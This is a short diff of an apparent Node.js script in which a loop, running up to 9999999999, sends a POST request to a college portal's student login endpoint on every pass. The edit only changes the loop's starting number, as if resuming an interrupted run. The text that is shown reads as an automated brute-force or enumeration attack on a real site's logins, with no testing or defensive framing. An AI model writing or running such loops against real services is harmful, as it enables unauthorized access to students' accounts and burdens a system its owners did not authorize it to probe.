@@ -35,7 +35,7 @@ app.listen(port, () => {
 
 const main = async () => {
     try {
-        for (i = 17283; i <= 9999999999; i++) {
+        for (i = 23283; i <= 9999999999; i++) {
             const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
                 method: "POST",
                 headers: {
